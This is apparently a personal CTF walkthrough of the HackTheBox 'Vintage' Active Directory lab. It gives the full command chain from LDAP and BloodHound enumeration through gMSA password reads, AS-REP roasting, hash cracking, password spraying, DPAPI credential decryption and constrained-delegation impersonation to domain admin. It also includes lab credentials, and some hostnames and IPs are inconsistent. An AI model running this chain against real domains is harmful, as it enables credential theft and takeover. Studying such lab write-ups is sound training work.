**NOTES:**

VPN 10.10.11.42

**Machine Information**

As is common in Windows pentests, you will start the Certified box with
credentials for the following account: **Username: P.Rosa Password:
Rosaisbest123**

**1**. Add **vintage.htb** to **/etc/hosts** file

**RUN:** **sudo nano /etc/hosts**

**2. MORE COMPREHENSIVE Nmap scan (Port 5985 = WinRM remote login)**

**RUN: sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txt
administrator.htb**

![](images/media/image1.png){width="5.161457786526684in"
height="3.338326771653543in"}

Found **LDAP SERVER: PORT 3268**

Found **Kerberos service: PORT 88 ?right port?**

Found **WinRM service: PORT 5985**

**It is found that in the line of port 3269, there is a DOMAIN
CONTROLLER: DC01**

**2.1** Add **DC01.vintage.htb** and **vintage.htb** to **/etc/hosts**

![](images/media/image2.png){width="4.640624453193351in"
height="2.8172298775153104in"}

**3. LDAP query**

**RUN: ldapsearch -x -H ldap://10.10.11.45 -D \"P.Rosa@vintage.htb\" -w
\"Rosaisbest123\" -b \"DC=vintage,DC=htb\" \"(objectClass=user)\"
sAMAccountName memberOf**

![](images/media/image3.png){width="5.563888888888889in"
height="4.476207349081365in"}

![](images/media/image4.png){width="5.5641163604549435in"
height="4.583333333333333in"}

**[INFO:]{.mark}** In the screenshots above are **CN=ServiceManagers
entries** e.g. L.Bianchi User. Search in **Bloodhound GUI** for
**ServiceManagers group**. You see that **[GMSA01\$ User has AddSelf
right]{.mark}** **to ServiceManagers group**

FOUND COMPUTER FS01.vintage.htb in screenshots above

- Add **10.10.11.45 FS01.vintage.htb** to **/etc/hosts**

![](images/media/image5.png){width="2.2916666666666665in"
height="1.9340354330708662in"}

**[Bloodhound]{.underline}**

**4.Start Bloodhound**

**RUN: sudo neo4j console [(This starts the service)]{.mark}**

**-Start Bloodhound GUI**

**RUN: bloodhound-python -u P.Rosa -p \'Rosaisbest123\' -c All -d
vintage.htb -ns 10.10.11.45**

**[ERROR -\> WARNING:]{.mark} Could not resolve: FS01.vintage.htb: The
resolution lifetime expired after 3.104 seconds: Server
Do53:10.10.11.45@53 answered The DNS operation timed out.**

**[Ignore it and go to next STEP]{.mark}**

![](images/media/image6.png){width="6.291666666666667in"
height="1.59375in"}

**5. Import** previously downloaded **JSON-files into Bloodhound GUI**

**6.** Analyzed data: **Bianchi is member of admin group and has admin
privileges**

![](images/media/image7.png){width="5.494791119860017in"
height="3.7860017497812772in"}

**7.** Look for **CN=Managed Service Accounts. FOUND gMSA01**

**- Analyzed data: User gMSA01 has GenericWrite to
ServiceManagers@Vintage.htb. Can AddSelf to ServiceManagers@Vintage.htb
(Administrators Group)**

![](images/media/image8.png){width="6.2972222222222225in"
height="3.1145833333333335in"}

**8. Check Intra-Domain relations. SEE INBOUND CONTROL RIGHTS of
<gMSA01$@vintage.htb>**

![](images/media/image9.png){width="2.3541666666666665in"
height="3.3022659667541556in"}

![](images/media/image10.png){width="5.739583333333333in"
height="4.984475065616798in"}

**- FS01.vintage.htb** can **read PASSWORD from gMSA01\$@vintage.htb.
Then gMSA01\$@vintage.htb can add itself to Administrator group**

![](images/media/image11.png){width="6.291666666666667in"
height="2.265972222222222in"}

**///-USER-//////////////////////////////////////////////////////////////////////////////////////**

**U1.**

INFO: Use GetTGT.py: provide password, hash or aeskey to request TGT and
save it in ccache format

**RUN: impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01\$:fs01**

![](images/media/image12.png){width="6.2972222222222225in"
height="2.4430555555555555in"}

**U2.**

INFO: Set the environment variable KRB5CCNAME=FS01\\\$.ccache to specify
the cache file that the Kerberos client should use.

**RUN: export KRB5CCNAME=FS01\\\$.ccache**

![](images/media/image13.png){width="2.5156244531933507in"
height="0.30828740157480317in"}

**U3. NTLM HASH**

**INFO:** Use bloodyAD to interact with Active Directory, through
Kerberos authentication,

to obtain the password (stored in the attribute) msDS-ManagedPassword of
the managed service account named GMSA01\$ from the specified Active
Directory domain controller

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -k get object \'GMSA01\$\' \--attr msDS-ManagedPassword**

![](images/media/image14.png){width="6.291666666666667in"
height="0.7291666666666666in"}

**U4.**

INFO: Attempt to obtain a Kerberos ticket from the Active Directory
domain controller using the known GMSA account hash from STEP U3

**RUN: impacket-getTGT vintage.htb/GMSA01\$ -hashes
aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178**

![](images/media/image15.png){width="5.036457786526684in"
height="0.5503412073490813in"}

**RUN: export KRB5CCNAME=GMSA01\\\$.ccache**

![](images/media/image16.png){width="2.192707786526684in"
height="0.2672703412073491in"}

**U5.**

INFO: Then add P.Rosa to SERVICEMANAGERS, use GMSA\'s credentials, and
then generate your own credentials

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -k add groupMember \"SERVICEMANAGERS\" \"P.Rosa\"**

![](images/media/image17.png){width="4.885416666666667in"
height="0.3235378390201225in"}

**U5.1.**

INFO: Sets a new PASSWORD. Command creates P.Rosa.ccache file.

**RUN: impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip
dc01.vintage.htb**

![](images/media/image18.png){width="6.302083333333333in"
height="0.4847222222222222in"}

**U5.2.**

**INFO:**

**RUN: export KRB5CCNAME=P.Rosa.ccache**

![](images/media/image19.png){width="2.3854166666666665in"
height="0.25202209098862643in"}

**U6.**

**INFO: Try to use this Ticket to list users who do not need KERBEROS
DOMAIN AUTHENTICATION. First generate a USERNAME LIST of users in
Domain.**

**RUN: ldapsearch -x -H ldap://10.10.11.45 -D \"P.Rosa@vintage.htb\" -w
\"Rosaisbest123\" -b \"DC=vintage,DC=htb\" \"(objectClass=user)\"
sAMAccountName \| grep \"sAMAccountName:\" \| cut -d \" \" -f 2 \>
usernames.txt**

**U6.1.**

**INFO: List Users who don\'t need KERBEROS DOMAIN AUTHENTICATION**

**RUN: impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile
usernames.txt vintage.htb/**

**U6.2.**

INFO: Disable PREAUTHENTICATION

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH**

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH**

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH**

**U6.3.**

INFO: Enable Account

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE**

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE**

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE**

**-Repeating\--STEP\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

**U6.4.**

INFO: Check DOMAIN USER again, as in STEP U6.1

**RUN: impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile
usernames.txt vintage.htb/**

**U7.**

INFO: CRACK HASH of svc_sql -\> SVC_SQL password: Zer0the0ne

**RUN: hashcat -a 0 -m 18200 hash.txt /home/kali/Desktop/rockyou.txt
--show**

**U8.**

INFO: **PASSWORD SPARYING**. Blast User with KERBRUTE

Kerbrute is a tool specifically designed for **attacking and enumerating
information** related to the **Kerberos authentication protocol**.

**RUN: kerbrute \--dc vintage.htb -d vintage.htb -v passwordspray
usernames.txt Zer0the0ne**

**U9.**

INFO: See User: C.Neri relations in Bloodhound overview

**U10.**

INFO: Requests TGT for User: C.Neri. FILE c.neri.ccache has been created

**RUN: impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip
vintage.htb**

**RUN: export KRB5CCNAME=c.neri.ccache**

**-Get user.txt\-\--**

**U11.**

INFO: Login remotely with WinRM. IF ERROR OCCURS, check the resolv.conf
file!!

**RUN: evil-winrm -i dc01.vintage.htb -r vintage.htb**

**///-ROOT-//////////////////////////////////////////////////////////////////////////////////////**

**R1.**

INFO:

**RUN: whoami /user**

**R2.**

INFO:

**RUN: whoami /priv**

**DEPAPI is here in documentary**

**R3.**

INFO: Use DPAPI to obtain WINDOWS IDENTITY CREDENTIALS

**RUN: cd C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials**

**RUN: dir -h (lists files and folders in WINDOWS)**

**RUN: download C4BB96844A5C9DD45D5B6A9859252BA6**

![](images/media/image20.png){width="4.0426541994750655in"
height="1.1539610673665792in"}

**E.G. Error**: **malloc_consolidate(): unaligned fastbin chunk
detected**

**SOLUTION:** Relogin and repeat the STEP if such an ERROR occurs

![](images/media/image21.png){width="6.298611111111111in"
height="0.5736111111111111in"}

**E.G. Win-RM Login Error**: **An erro of type GSSAPI::GsApiError
happened, message is gss_init_sec_context did not return GSS_S_COMPLETE:
No credentials were supplied, or the credentials were unavailable or
inaccessible. No Kerberos credentials available (default cache:
FILE:/tmp/krb5cc_1000)**

![](images/media/image22.png){width="6.298611111111111in"
height="1.3506944444444444in"}

**SOLUTION:** Edit /etc/resolv.conf like this

**modded**

![](images/media/image23.png){width="3.9573458005249345in"
height="0.9387948381452318in"}

**ORIGINAL**

![](images/media/image24.png){width="3.9559022309711285in"
height="0.7440758967629046in"}

**R4.**

INFO:

**RUN: cd
C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115**

**RUN: dir -h (lists files and folders in WINDOWS)**

**RUN: download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b**

**R5.**

INFO: Enter the decription

**RUN: impacket-dpapi masterkey -file
99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid
S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne**

**R6.**

INFO:

**RUN: impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6
-key
0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a**

**IT SHOULD RESULT LIKE THIS: The password of c.neri_adm is:
Uncr4ck4bl3P4ssW0rd0312**

**R7.**

INFO: The next step is to add C.NERI_ADM to DELEGATEDADMINS (c.neri ??)

**SVC_SQL added to DELEGATEDADMINS**

**RUN: bloodyAD \--host dc01.vintage.htb \--dc-ip 10.10.11.45 -d
\"VINTAGE.HTB\" -u c.neri_adm -p \'Uncr4ck4bl3P4ssW0rd0312\' -k add
groupMember \"DELEGATEDADMINS\" \"SVC_SQL\"**

![](images/media/image25.png){width="6.298611111111111in"
height="0.2986111111111111in"}

**[IMPORTANT! Both commands R7.1.+R7.2. below, have to be set fast,
otherwise impacket-getTGT won\'t work in STEP R8 !]{.mark}**

**R7.1. WORKED**

INFO: SVC_SQL's SPN (ServicePrincipalName) has been updated to
"cifs/fake"

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -u c.neri -p \"Zer0the0ne\" -k set object \"SVC_SQL\"
servicePrincipalName -v \"cifs/fake\"**

![](images/media/image26.png){width="6.288888888888889in"
height="0.34097222222222223in"}

**R7.2. WORKED**

**RUN: Set-ADUser -Identity svc_sql -Enabled \$true**

(Run that on Target Server in POWERSHELL REMOTE SESSION)

**R7.3.**

INFO: This command doublechecks if the previous 2 were set correctly

**RUN: Get-ADUser -Identity svc_sql -Properties ServicePrincipalNames**

(Run that on Target Server in POWERSHELL REMOTE SESSION)

**Result should look like this**

![](images/media/image27.png){width="4.938389107611549in"
height="1.7327679352580927in"}

**In this example, Enabled is Flase. Solution: Run the command from
screenshot above to active it.**

![](images/media/image28.png){width="4.312742782152231in"
height="1.753555336832896in"}

**R8.**

INFO: Get the ticket for this SVC

**RUN: impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip
dc01.vintage.htb**

**RUN: export KRB5CCNAME=svc_sql.ccache**

![](images/media/image29.png){width="3.0947867454068243in"
height="0.7085608048993876in"}

**R9.**

INFO: Impersonate L.BIANCHI_ADM user to **request cifs/dc01.vintage.htba
service ticket** for the service. After successfully obtaining the
ticket, you can use it to access the service.

**RUN: impacket-getST -spn \'cifs/dc01.vintage.htb\' -impersonate
L.BIANCHI_ADM -dc-ip 10.10.11.45 -k \'vintage.htb/svc_sql:Zer0the0ne\'**

![](images/media/image30.png){width="5.312796369203849in"
height="0.7872550306211723in"}

**E.G. ERROR in R9.**

![](images/media/image31.png){width="6.298611111111111in"
height="0.9715277777777778in"}

**If an Error occurs in R9. do this RUN**

**RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
10.10.11.45 -u c.neri_adm -p \"Uncr4ck4bl3P4ssW0rd0312\" -k add
groupMember \"DELEGATEDADMINS\" \"SVC_SQL\"**

![](images/media/image25.png){width="6.298611111111111in"
height="0.2986111111111111in"}

**[RERUN R8 commands (get the ticket for this SVC)]{.mark}**

**RUN: impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip
dc01.vintage.htb**

**RUN: export KRB5CCNAME=svc_sql.ccache**

![](images/media/image32.png){width="3.1184831583552057in"
height="0.7139873140857392in"}

**R9.1.**

INFO: [RERUN R9 commands]{.mark}

**RUN: impacket-getST -spn \'cifs/dc01.vintage.htb\' -impersonate
L.BIANCHI_ADM -dc-ip 10.10.11.45 -k \'vintage.htb/svc_sql:Zer0the0ne\'**

![](images/media/image33.png){width="5.255924103237096in"
height="0.7800306211723534in"}

**R9.2.**

INFO:

**RUN: export
KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache**

![](images/media/image34.png){width="3.1771522309711284in"
height="0.24644575678040245in"}

**R10. Root.txt**

INFO: Now that we have the ticket for L.BIANCHI, we can directly execute
the command through wmiexec

**RUN: impacket-wmiexec -k -no-pass
VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb**

![](images/media/image35.png){width="3.071090332458443in"
height="1.0097014435695537in"}
